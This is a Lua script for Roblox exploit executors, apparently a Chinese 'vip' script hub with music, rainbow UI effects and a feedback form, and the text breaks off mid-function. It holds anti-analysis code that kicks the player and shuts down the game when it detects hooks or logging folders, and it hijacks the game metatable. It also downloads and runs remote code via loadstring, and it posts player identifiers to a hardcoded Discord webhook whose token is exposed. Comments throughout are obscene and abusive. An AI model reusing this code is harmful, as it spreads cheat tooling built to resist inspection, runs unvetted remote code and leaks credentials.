local RandomMessage = `[{math.random()}]`
local Passed = false

game:GetService("LogService").MessageOut:Connect(function(Message, MessageType)
	if Message == RandomMessage and MessageType == Enum.MessageType.MessageOutput then
		Passed = true
	end
end)

print(RandomMessage)

repeat
	task.wait()
until Passed

local function probeArith()
    local chunk, _ = loadstring([[
        local a = "hello"
        local b = 2
        return a - b
    ]])
    if not chunk then return false end

    local ok, _ = pcall(chunk)
    return not ok        
end

local function probeCall()
    local ok, _ = pcall(function() (nil)() end)
    return not ok
end

local function probeFS()
    local ok, _ = pcall(function()
        if not isfolder("BS_script") then makefolder("BS_script") end
        if not isfolder("BS_script/Music") then makefolder("BS_script/Music") end
    end)
    return ok and isfolder("BS_script/Music")
end

local function coreLogic()

local shit=function()pcall(function()game.Players.LocalPlayer:Kick()end)pcall(game.Shutdown,game)end

local fuck=function()return"a"end
hookfunction(fuck,function()return"b"end)
if not isfunctionhooked then shit()return end
if not isfunctionhooked(fuck)then shit()return end

local bitch=game.HttpGet
hookfunction(bitch,function()end)
if not isfunctionhooked(bitch)then shit()return end
restorefunction(bitch)
if isfunctionhooked(bitch)then shit()return end

local cunt=request or http_request or(syn and syn.request)or(fluxus and fluxus.request)

spawn(function()
    while task.wait(0.5)do
        pcall(function()
            if isfunctionhooked(game.HttpGet)then shit()end
            if isfunctionhooked(game.HttpPost)then shit()end
            if isfunctionhooked(tostring)then shit()end
            if isfunctionhooked(setclipboard)then shit()end
            if cunt and isfunctionhooked(cunt)then shit()end
            if isfolder("HttpGetFolder")or isfolder("WebhookFolder")or isfolder("RequestFolder")then shit()end
        end)
    end
end)

for _,dick in pairs({"rconsoleprint","rconsolewarn","rconsoleinfo","rconsoleerr","rconsoletitle","clonefunction"})do
    getgenv()[dick]=nil
end

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local musicIds = {
    1835172813, 
    1835318849  
}

local sounds = {}
local currentSoundIndex = 1
local allMusicFinished = false

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MusicControlGUI"
screenGui.Parent = playerGui

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 20) 
closeButton.Position = UDim2.new(1, -35, 1, -25) 
closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Text = "X"
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 12
closeButton.Visible = true 
closeButton.Parent = screenGui

local function playNextMusic()
  
    if sounds[currentSoundIndex] then
        sounds[currentSoundIndex]:Stop()
    end
   
    if currentSoundIndex <= #musicIds then
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. musicIds[currentSoundIndex]
        sound.Volume = 0.5
        sound.Parent = workspace
      
        sounds[currentSoundIndex] = sound
        
        sound:Play()
       
        sound.Ended:Connect(function()
          
            currentSoundIndex = currentSoundIndex + 1
            
            if currentSoundIndex <= #musicIds then
                playNextMusic()
            else
                allMusicFinished = true
                closeButton.Visible = false
            end
        end)
        
        print("正在播放音乐 ID: " .. musicIds[currentSoundIndex])
    end
end

local function stopAllMusicAndHideButton()
    for i, sound in pairs(sounds) do
        if sound and sound.Playing then
            sound:Stop()
        end
        if sound then
            sound:Destroy()
        end
    end
    sounds = {}
    currentSoundIndex = 1
    
    closeButton.Visible = false
end

closeButton.MouseButton1Click:Connect(function()
    stopAllMusicAndHideButton()
end)

playNextMusic()

game:GetService("RunService").Heartbeat:Connect(function()
    if not screenGui or not screenGui.Parent then
        warn("GUI丢失，重新创建...")
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "MusicControlGUI"
        screenGui.Parent = playerGui
        
        closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 30, 0, 20)
        closeButton.Position = UDim2.new(1, -35, 1, -25)
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.Text = "X"
        closeButton.Font = Enum.Font.SourceSansBold
        closeButton.TextSize = 12
        closeButton.Visible = not allMusicFinished
        closeButton.Parent = screenGui
        
        closeButton.MouseButton1Click:Connect(stopAllMusicAndHideButton)
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RainbowTextGUI"
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local rainbowText = Instance.new("TextLabel")
rainbowText.Size = UDim2.new(0, 400, 0, 100)
rainbowText.Position = UDim2.new(0.5, -200, 0.3, 0)
rainbowText.BackgroundTransparency = 1
rainbowText.Text = "点击右下角按钮关闭音乐播放"
rainbowText.TextColor3 = Color3.fromRGB(255, 0, 0)
rainbowText.Font = Enum.Font.GothamBlack
rainbowText.TextSize = 48
rainbowText.TextStrokeTransparency = 0.5
rainbowText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
rainbowText.Parent = screenGui
local hueOffset = 0
local animationSpeed = 2

local function updateRainbowGradient()
    while rainbowText and rainbowText.Parent do
        local r = math.sin(hueOffset) * 0.5 + 0.5
        local g = math.sin(hueOffset + 2 * math.pi / 3) * 0.5 + 0.5
        local b = math.sin(hueOffset + 4 * math.pi / 3) * 0.5 + 0.5
        
        rainbowText.TextColor3 = Color3.new(r, g, b)
        
        hueOffset = hueOffset + (animationSpeed * 0.05)
        if hueOffset >= 2 * math.pi then
            hueOffset = hueOffset - 2 * math.pi
        end
        
        RunService.Heartbeat:Wait()
    end
end

coroutine.wrap(updateRainbowGradient)()

local originalPosition = rainbowText.Position
rainbowText.Position = originalPosition + UDim2.new(0, 0, 0, 50)
rainbowText.TextTransparency = 1

local fadeInTween = TweenService:Create(rainbowText, TweenInfo.new(1, Enum.EasingStyle.Back), {
    Position = originalPosition,
    TextTransparency = 0
})
fadeInTween:Play()

wait(5)

local function startDisappearAnimation()
    local breatheOut = TweenService:Create(rainbowText, TweenInfo.new(1, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0, 380, 0, 95)
    })
    breatheOut:Play()
    
    wait(0.5)
    local fadeOutSlow = TweenService:Create(rainbowText, TweenInfo.new(2, Enum.EasingStyle.Quad), {
        TextTransparency = 0.7,
        BackgroundTransparency = 1
    })
    fadeOutSlow:Play()
    
    wait(1.5)
    local fadeOutFast = TweenService:Create(rainbowText, TweenInfo.new(1.5, Enum.EasingStyle.Exponential), {
        TextTransparency = 1,
        Position = rainbowText.Position + UDim2.new(0, 0, 0, 30)
    })
    fadeOutFast:Play()
    
    fadeOutFast.Completed:Connect(function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

startDisappearAnimation()

local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 0.843, 0)  -- 金色背景
LBL.BackgroundTransparency = 1  -- 背景透明
LBL.BorderColor3 = Color3.new(1, 0.843, 0)  -- 金色边框
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 0.843, 0)  -- 金色文字
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
  LastIteration = tick()
  for Index = #FrameUpdateTable, 1, -1 do
    FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
  end
  FrameUpdateTable[1] = LastIteration
  local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
  CurrentFPS = CurrentFPS - CurrentFPS % 1
  FpsLabel.Text = ("vip时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S").."秒")
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)

    --Kenny泛滥外部汉化脚本我的哔站UID:1531514159（删了这个死妈死爹死全家）
local Translations = {
    ["Close Window"] = "关闭窗口",
    ["Do you want to close this window? You will not be able to open it again."]= "求你了别关脚本😭😭",
    ["Cancel"]= "取消",
    ["Close Window"]= "关闭窗口",
    ["Locked"] = "锁定",
    ["Search"] = "搜索",
}

local function translateText(text)
    if not text or type(text) ~= "string" then return text end
    
    if Translations[text] then
        return Translations[text]
    end
    
    for en, cn in pairs(Translations) do
        if text:find(en) then
            return text:gsub(en, cn)
        end
    end
    
    return text
end

local function setupTranslationEngine()
    local success, err = pcall(function()
        local oldIndex = getrawmetatable(game).__newindex
        setreadonly(getrawmetatable(game), false)
        
        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
                v = translateText(tostring(v))
            end
            return oldIndex(t, k, v)
        end)
        
        setreadonly(getrawmetatable(game), true)
    end)
    
    if not success then
        warn("元表劫持失败:", err)
       
        local translated = {}
        local function scanAndTranslate()
            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                    pcall(function()
                        local text = gui.Text
                        if text and text ~= "" then
                            local translatedText = translateText(text)
                            if translatedText ~= text then
                                gui.Text = translatedText
                                translated[gui] = true
                            end
                        end
                    end)
                end
            end
            
            local player = game:GetService("Players").LocalPlayer
            if player and player:FindFirstChild("PlayerGui") then
                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                        pcall(function()
                            local text = gui.Text
                            if text and text ~= "" then
                                local translatedText = translateText(text)
                                if translatedText ~= text then
                                    gui.Text = translatedText
                                    translated[gui] = true
                                end
                            end
                        end)
                    end
                end
            end
        end
        
        local function setupDescendantListener(parent)
            parent.DescendantAdded:Connect(function(descendant)
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                    task.wait(0.1)
                    pcall(function()
                        local text = descendant.Text
                        if text and text ~= "" then
                            local translatedText = translateText(text)
                            if translatedText ~= text then
                                descendant.Text = translatedText
                            end
                        end
                    end)
                end
            end)
        end
        
        pcall(setupDescendantListener, game:GetService("CoreGui"))
        local player = game:GetService("Players").LocalPlayer
        if player and player:FindFirstChild("PlayerGui") then
            pcall(setupDescendantListener, player.PlayerGui)
        end
        
        while true do
            scanAndTranslate()
            task.wait(3)
        end
    end
end

task.wait(2)

setupTranslationEngine()

local success, err = pcall(function()

__SECROVIA__ = "你看你妈呢我拿那个鼠标"
__LUMINARIA__ = "乱七八糟的中文"
__OBFUSCATE__ = "看不懂的内容🤣😂"

end)

if not success then
    warn("加载失败:", err)
end

local function InjectSnow(targetTitle)
    local RunService = game:GetService("RunService")
    local CoreGui = game:GetService("CoreGui")
    local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

    local function FindMainFrame()
        local searchArea = (gethui and gethui()) or CoreGui
        for _, v in pairs(searchArea:GetDescendants()) do
            if v:IsA("TextLabel") and v.Text == targetTitle then
                local p = v.Parent
                while p and not p:IsA("CanvasGroup") and not (p:IsA("Frame") and p.Size.X.Offset > 300) do
                    p = p.Parent
                end
                return p
            end
        end
        return nil
    end

    task.spawn(function()
        local mainFrame = nil
        for i = 1, 20 do
            mainFrame = FindMainFrame()
            if mainFrame then break end
            task.wait(0.5)
        end

        if not mainFrame then 
            warn("没有UI啊😡")
            return 
        end

        mainFrame.ClipsDescendants = true

        local SnowCanvas = Instance.new("Frame")
        SnowCanvas.Name = "SnowCanvas"
        SnowCanvas.Size = UDim2.fromScale(1, 1)
        SnowCanvas.BackgroundTransparency = 1
        SnowCanvas.ZIndex = 1
        SnowCanvas.Parent = mainFrame

        local flakes = {}
        for i = 1, 40 do
            local flake = Instance.new("TextLabel")
            flake.Text = "❄️"
            flake.BackgroundTransparency = 1
            flake.TextTransparency = math.random(2, 5) / 10
            flake.Size = UDim2.fromOffset(math.random(12, 20), math.random(12, 20))
            flake.TextScaled = true
            flake.Position = UDim2.new(math.random(), 0, math.random(), 0)
            flake.Parent = SnowCanvas
            
            table.insert(flakes, {
                obj = flake,
                speed = math.random(10, 30) / 100,
                drift = math.random(-10, 10) / 100
            })
        end
        RunService.RenderStepped:Connect(function()
            if not mainFrame.Visible then return end          
            for _, f in ipairs(flakes) do
                local pos = f.obj.Position
                local newY = pos.Y.Scale + (f.speed * 0.005)
                local newX = pos.X.Scale + (math.sin(tick() + f.speed) * 0.001)
                
                if newY > 1 then
                    newY = -0.1
                    newX = math.random()
                end
                f.obj.Position = UDim2.new(newX, 0, newY, 0)
            end
        end)
    end)
end

local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/sw/refs/heads/main/main.lua"))()

-- 颜色方案定义
local COLOR_SCHEMES = {
    ["彩虹颜色"] = {
        ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromHex("FF0000")),
            ColorSequenceKeypoint.new(0.16, Color3.fromHex("FFA500")),
            ColorSequenceKeypoint.new(0.33, Color3.fromHex("FFFF00")),
            ColorSequenceKeypoint.new(0.5, Color3.fromHex("00FF00")),
            ColorSequenceKeypoint.new(0.66, Color3.fromHex("0000FF")),
            ColorSequenceKeypoint.new(0.83, Color3.fromHex("4B0082")),
            ColorSequenceKeypoint.new(1, Color3.fromHex("EE82EE"))
        }),
        "palette"
    },
    -- 其他颜色方案...
}

local rainbowBorderAnimation
local currentBorderColorScheme = "彩虹颜色"
local borderInitialized = false
local animationSpeed = 2
local borderEnabled = true

-- 创建彩虹边框
local function createRainbowBorder(window, colorScheme, speed)
    if not window or not window.UIElements then
        wait(1)
        if not window or not window.UIElements then
            return nil, nil
        end
    end
    
    local mainFrame = window.UIElements.Main
    if not mainFrame then
        return nil, nil
    end
    
    local existingStroke = mainFrame:FindFirstChild("RainbowStroke")
    if existingStroke then
        local glowEffect = existingStroke:FindFirstChild("GlowEffect")
        if glowEffect then
            local schemeData = COLOR_SCHEMES[colorScheme or currentBorderColorScheme]
            if schemeData then
                glowEffect.Color = schemeData[1]
            end
        end
        return existingStroke, rainbowBorderAnimation
    end
    
    -- 添加圆角
    if not mainFrame:FindFirstChildOfClass("UICorner") then
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 16)
        corner.Parent = mainFrame
    end
    
    -- 创建边框描边
    local rainbowStroke = Instance.new("UIStroke")
    rainbowStroke.Name = "RainbowStroke"
    rainbowStroke.Thickness = 1.5
    rainbowStroke.Color = Color3.new(1, 1, 1)
    rainbowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    rainbowStroke.LineJoinMode = Enum.LineJoinMode.Round
    rainbowStroke.Enabled = borderEnabled
    rainbowStroke.Parent = mainFrame
    
    -- 添加渐变效果
    local glowEffect = Instance.new("UIGradient")
    glowEffect.Name = "GlowEffect"
    
    local schemeData = COLOR_SCHEMES[colorScheme or currentBorderColorScheme]
    if schemeData then
        glowEffect.Color = schemeData[1]
    else
        glowEffect.Color = COLOR_SCHEMES["彩虹颜色"][1]
    end
    
    glowEffect.Rotation = 0
    glowEffect.Parent = rainbowStroke
    
    return rainbowStroke, nil
end

-- 启动边框动画
local function startBorderAnimation(window, speed)
    if not window or not window.UIElements then
        return nil
    end
    
    local mainFrame = window.UIElements.Main
    if not mainFrame then
        return nil
    end
    
    local rainbowStroke = mainFrame:FindFirstChild("RainbowStroke")
    if not rainbowStroke or not rainbowStroke.Enabled then
        return nil
    end
    
    local glowEffect = rainbowStroke:FindFirstChild("GlowEffect")
    if not glowEffect then
        return nil
    end
    
    if rainbowBorderAnimation then
        rainbowBorderAnimation:Disconnect()
        rainbowBorderAnimation = nil
    end
    
    local animation
    animation = game:GetService("RunService").Heartbeat:Connect(function()
        if not rainbowStroke or rainbowStroke.Parent == nil or not rainbowStroke.Enabled then
            animation:Disconnect()
            return
        end
        
        local time = tick()
        glowEffect.Rotation = (time * speed * 60) % 360
    end)
    
    rainbowBorderAnimation = animation
    return animation
end

-- 初始化彩虹边框
local function initializeRainbowBorder(scheme, speed)
    speed = speed or animationSpeed
    
    local rainbowStroke, _ = createRainbowBorder(Window, scheme, speed)
    if rainbowStroke then
        if borderEnabled then
            startBorderAnimation(Window, speed)
        end
        borderInitialized = true
        return true
    end
    return false
end

-- 在UI创建后初始化边框
if not borderInitialized then
    spawn(function()
        wait(0.5)
        initializeRainbowBorder("彩虹颜色", animationSpeed)
    end)
end

-- 创建金色主题
WindUI:AddTheme({
    Name = "GoldenTheme",
    Accent = Color3.fromHex("#FFD700"),      -- 金色主色调
    Dialog = Color3.fromHex("#2a2a2a"),
    Outline = Color3.fromHex("#FFA500"),     -- 橙色边框
    Text = Color3.fromHex("#FFFFFF"),
    Placeholder = Color3.fromHex("#888888"),
    Background = Color3.fromHex("#1a1a1a"),
    Button = Color3.fromHex("#4a3a1a"),      -- 金色系按钮
    Icon = Color3.fromHex("#FFD700")         -- 金色图标
})

WindUI.TransparencyValue = 0.2
WindUI:SetTheme("GoldenTheme")  -- 应用金色主题

local function gradient(text, startColor, endColor)
    local result = ""
    for i = 1, #text do
        local t = (i - 1) / (#text - 1)
        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)
        result = result .. string.format('<font color="rgb(%d,%d,%d)">%s</font>', r, g, b, text:sub(i, i))
    end
    return result
end

local Window = WindUI:CreateWindow({
    Title = '<font color="#00FF00">刘某脚本</font>    ',  
    Icon = "badge-check",
    Author = "作者:刘某",
    Folder = "WindUI_Example",
    Size = UDim2.fromOffset(300, 350),
    Theme = "Dark",
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            WindUI:Notify({
                Title = "点这干啥",
                Content = "点了没有用",
                Duration = 3
            })
        end
    },
    SideBarWidth = 220,
    ScrollBarEnabled = true,
    HideSearchBar = false,
    Background = 'rbxassetid://117645426728324'
})

InjectSnow('<font color="#00FF00">刘某脚本</font>    ')

Window:EditOpenButton({
    Title = "打开刘某脚本",
    Icon = "crown",
    CornerRadius = UDim.new(1, 1),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromHex("#FFD700"),  
        Color3.fromHex("#FFA500")   
    ),
    OnlyMobile = false,
    Enabled = true,
    Draggable = true,
    Size = UDim2.new(0, 150, 0, 40)
})

Window:Tag({
    Title = "v4.1",
    Color = Color3.fromHex("#30ff6a")
})

Window:Tag({
    Title = "正式版",
    Color = Color3.fromHex("#FFD700")  -- 金色标签
})

local TimeTag = Window:Tag({
    Title = "00:00",
    Color = Color3.fromHex("#30ff6a"),
})

task.spawn(function()
    while true do
        for i = 0, 100 do
            local hue = i / 100
            TimeTag:SetColor(Color3.fromHSV(hue, 1, 1))
            TimeTag:SetTitle(os.date("%H:%M"))
            task.wait(0.06)
        end
    end
end)

spawn(function()
    while true do
        for hue = 0, 1, 0.01 do  
            local color = Color3.fromHSV(hue, 0.8, 1)  
            Window:EditOpenButton({
                Color = ColorSequence.new(color)
            })
            wait(0.04)  
        end
    end
end)
if not borderInitialized then
    spawn(function()
        wait(0.5)
        initializeRainbowBorder("彩虹颜色", animationSpeed)
        wait(1)
        applyFontStyleToWindow(currentFontStyle)
    end)
end

local windowOpen = true

Window:OnClose(function()
    windowOpen = false
    if rainbowBorderAnimation then
        rainbowBorderAnimation:Disconnect()
        rainbowBorderAnimation = nil
    end
end)

local originalOpenFunction = Window.Open
Window.Open = function(...)
    windowOpen = true
    local result = originalOpenFunction(...)
    
    if borderInitialized and borderEnabled and not rainbowBorderAnimation then
        wait(0.1)
        startBorderAnimation(Window, animationSpeed)
    end
    
    return result
end

Window:CreateTopbarButton("theme-switcher", "moon", function()
    WindUI:SetTheme(WindUI:GetCurrentTheme() == "Dark" and "GoldenTheme" or "Dark")
    WindUI:Notify({
        Title = "主题已更改",
        Content = "当前主题: "..WindUI:GetCurrentTheme(),
        Duration = 2
    })
end, 990)

local Tabs = {
    Settings = Window:Section({ Title = "界面", Opened = false }),
}

local TabHandles = {
    Appearance = Tabs.Settings:Tab({ Title = "颜色", Icon = "brush" }),
}

TabHandles.Appearance:Paragraph({
    Title = "自定义界面",
    Desc = "个性化您的体验",
    Image = "palette",
    ImageSize = 20,
    Color = "White"
})

local themes = {}
for themeName, _ in pairs(WindUI:GetThemes()) do
    table.insert(themes, themeName)
end
table.sort(themes)

local themeDropdown = TabHandles.Appearance:Dropdown({
    Title = "颜色",
    Values = themes,
    Value = "Dark",
    Callback = function(theme)
        WindUI:SetTheme(theme)
        WindUI:Notify({
            Title = "主题已应用",
            Content = theme,
            Icon = "crown",
            Duration = 2
        })
    end
})

local transparencySlider = TabHandles.Appearance:Slider({
    Title = "透明度",
    Value = { 
        Min = 0,
        Max = 1,
        Default = 0.2,
    },
    Step = 0.1,
    Callback = function(value)
        Window:ToggleTransparency(tonumber(value) > 0)
        WindUI.TransparencyValue = tonumber(value)
    end
})

TabHandles.Appearance:Toggle({
    Title = "启用深色模式",
    Desc = "使用深色配色方案",
    Value = true,
    Callback = function(state)
        WindUI:SetTheme(state and "GoldenTheme" or "Light")
        themeDropdown:Select(state and "GoldenTheme" or "Light")
    end
})

TabHandles.Appearance:Button({
    Title = "创建新主题",
    Icon = "plus",
    Callback = function()
        Window:Dialog({
            Title = "创建主题",
            Content = "此功能即将推出！",
            Buttons = {
                {
                    Title = "确定",
                    Variant = "Primary"
                }
            }
        })
    end
})

local Tab = Window:Tab({
    Title = "简介",
    Icon = "app-window",
    Locked = false,
    Opened = true,
})

Tab:Select() -- Select Tab

local Section = Tab:Section({ 
    Title = "制作者:刘某",
    TextXAlignment = "Left",
    TextSize = 30
})

local Section = Tab:Section({ 
    Title = "合作者:一眼鸡",
    TextXAlignment = "Left",
    TextSize = 17
})

local Section = Tab:Section({ 
    Title = "QQ群:1070646590",
    TextXAlignment = "Left",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "QQ群:1070646590",
    Desc = "点击复制",
    Locked = false,
    Callback = function()
        local groupKey = "1070646590"  -- 这里填写你的QQ群号
        if setclipboard then
            setclipboard(groupKey)
            WindUI:Notify({
                Title = "群号已复制",
                Content = "群号: " .. groupKey,
                Icon = "crown",
                Duration = 3
            })
            print("已复制群号: " .. groupKey)
        else
            WindUI:Notify({
                Title = "错误",
                Content = "复制功能不可用",
                Icon = "crown",
                Duration = 3
            })
        end
    end
})

local Tab = Window:Tab({
    Title = "发送意见给刘某",
    Icon = "calendar-check",
    Locked = false,
    Opened = true,
})
        
-- ====================== 玩家交互-Tab3 消息发送功能【优化版】 ======================
Tab:Section({Title = "消息发送功能", Opened = true})

local messageHistory = {} -- 消息历史记录
local LocalPlayer = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local lastSendTime = 0 -- 上次发送时间（用于频率限制）
local MESSAGE_COOLDOWN = 10 -- 发送冷却时间（秒）

-- 尝试加载历史记录
pcall(function()
    if readfile and writefile then
        local success, data = pcall(function()
            return HttpService:JSONDecode(readfile("windui_message_history.json"))
        end)
        if success and type(data) == "table" then
            messageHistory = data
        end
    end
end)

-- 保存历史记录函数
local function saveMessageHistory()
    if writefile and #messageHistory > 0 then
        pcall(function()
            -- 只保存最近50条记录
            local toSave = {}
            local startIndex = math.max(1, #messageHistory - 49)
            for i = startIndex, #messageHistory do
                table.insert(toSave, messageHistory[i])
            end
            writefile("windui_message_history.json", HttpService:JSONEncode(toSave))
        end)
    end
end

-- 1. 消息输入框 - 使用变量引用以便后续操作
local messageInput = Tab:Input({
    Title = "输入要发送的消息",
    Value = "",
    Placeholder = "在此输入消息内容...",
    Callback = function(value)
        -- 实时存储输入内容
        if value and type(value) == "string" then
            messageContent = value
        else
            messageContent = ""
        end
    end
})

-- 2. 发送消息按钮【优化版】
Tab:Button({
    Title = "发送消息",
    Icon = "send",
    Description = "将消息发送到Discord频道",
    Callback = function()
        -- 频率限制检查
        local currentTime = os.time()
        if currentTime - lastSendTime < MESSAGE_COOLDOWN then
            local remaining = MESSAGE_COOLDOWN - (currentTime - lastSendTime)
            WindUI:Notify({
                Title = "发送过于频繁", 
                Content = string.format("请等待 %d 秒后再发送", remaining), 
                Icon = "clock", 
                Duration = 3
            })
            return
        end
        
        -- 获取并处理消息内容
        local msg = messageContent or ""
        msg = msg:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
        
        -- 输入验证
        if msg == "" then
            WindUI:Notify({
                Title = "消息为空", 
                Content = "请输入要发送的消息内容", 
                Icon = "alert-circle", 
                Duration = 3
            })
            return
        end
        
        if #msg > 2000 then
            WindUI:Notify({
                Title = "消息过长", 
                Content = string.format("消息长度 %d/2000 字符", #msg), 
                Icon = "type", 
                Duration = 3
            })
            return
        end
        
        -- 敏感词过滤（基础版）
        local blockedWords = {"密码", "token", "key", "admin", "作弊"}
        local lowerMsg = msg:lower()
        for _, word in ipairs(blockedWords) do
            if lowerMsg:find(word:lower()) then
                WindUI:Notify({
                    Title = "内容受限", 
                    Content = "消息包含受限内容，请修改后重试", 
                    Icon = "shield-off", 
                    Duration = 3
                })
                return
            end
        end
        
        -- 获取玩家信息（带错误处理）
        local pName, pId, dName = "未知", 0, "未知"
        local success, playerInfo = pcall(function()
            pName = LocalPlayer.Name
            pId = LocalPlayer.UserId
            dName = LocalPlayer.DisplayName
            return true
        end)
        
        if not success then
            WindUI:Notify({
                Title = "玩家信息获取失败", 
                Content = "无法获取当前玩家信息", 
                Icon = "user-x", 
                Duration = 3
            })
            return
        end
        
        -- 获取游戏信息
        local gameName, gameId = "未知游戏", game.PlaceId
        pcall(function()
            local productInfo = MarketplaceService:GetProductInfo(gameId)
            if productInfo and productInfo.Name then
                gameName = productInfo.Name
            end
        end)
        
        -- 构建Discord Webhook消息
        local timestamp = os.date("%Y-%m-%d %H:%M:%S")
        local truncatedMsg = #msg > 1000 and msg:sub(1, 1000) .. "..." or msg
        
        local webhookData = {
            username = "刘某脚本消息系统",
            avatar_url = "https://cdn.discordapp.com/attachments/1468097591618048013/1468111096052318333/Image_1769086221054_853.png?ex=6982d481&is=69818301&hm=c8266a7ce1211220a7714fdc2b886acaa884abe348b41b9bc87cbd092e23916b&",
            embeds = {{
                color = 3447003,
                title = "📨 新消息通知",
                description = string.format("**玩家发送了消息**\n\n📝 内容：```%s```", truncatedMsg),
                thumbnail = {
                    url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", pId)
                },
                fields = {
                    {
                        name = "👤 发送者信息",
                        value = string.format("用户名: %s\n显示名: %s\n用户ID: %d", pName, dName, pId),
                        inline = true
                    },
                    {
                        name = "🕐 时间信息",
                        value = string.format("发送时间: %s\n游戏时间: %s", timestamp, game:GetService("Workspace").DistributedGameTime),
                        inline = true
                    },
                    {
                        name = "🎮 游戏信息",
                        value = string.format("游戏ID: %d\n游戏名称: %s\n服务器ID: %s", 
                            gameId, gameName, game.JobId),
                        inline = false
                    }
                },
                footer = {
                    text = "刘某脚本 • 消息系统",
                    icon_url = "https://cdn.discordapp.com/attachments/1468097591618048013/1468111096052318333/Image_1769086221054_853.png?ex=6982d481&is=69818301&hm=c8266a7ce1211220a7714fdc2b886acaa884abe348b41b9bc87cbd092e23916b&"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        
        -- 多执行器兼容的网络请求
        local reqFunc = nil
        local executors = {
            syn = syn and syn.request,
            fluxus = fluxus and fluxus.request,
            request = request,
            http_request = http_request,
            http = http and http.request
        }
        
        for _, func in pairs(executors) do
            if type(func) == "function" then
                reqFunc = func
                break
            end
        end
        
        if not reqFunc then
            WindUI:Notify({
                Title = "执行器不支持", 
                Content = "当前执行器不支持网络请求功能", 
                Icon = "wifi-off", 
                Duration = 4
            })
            return
        end
        
        -- Discord Webhook URL
        local webhookUrl = "https://discord.com/api/webhooks/1468108097607172126/gLQm1hoN3Jsnlirk_t8zfgqVwUr_7AdEtLCGqQO5oNi2E7nJgrJOudijClcsuqpGwvc8"
        
        -- 显示发送中状态
        WindUI:Notify({
            Title = "发送中...", 
            Content = "正在将消息发送到Discord", 
            Icon = "loader", 
            Duration = 2
        })
        
        -- 发送请求
        local requestSuccess, response = pcall(function()
            return reqFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "WindUI-Message-System/1.0"
                },
                Body = HttpService:JSONEncode(webhookData)
            })
        end)
        
        -- 处理响应
        if requestSuccess then
            -- 更新发送时间
            lastSendTime = currentTime
            
            -- 添加到历史记录
            table.insert(messageHistory, {
                text = msg,
                time = currentTime,
                timestamp = timestamp,
                success = true
            })
            
            -- 保存历史记录
            saveMessageHistory()
            
            -- 清空输入框
            messageContent = ""
            if messageInput and messageInput.SetValue then
                messageInput:SetValue("")
            end
            
            WindUI:Notify({
                Title = "发送成功", 
                Content = "消息已成功发送到Discord频道", 
                Icon = "check-circle", 
                Duration = 3
            })
        else
            -- 记录失败
            table.insert(messageHistory, {
                text = msg,
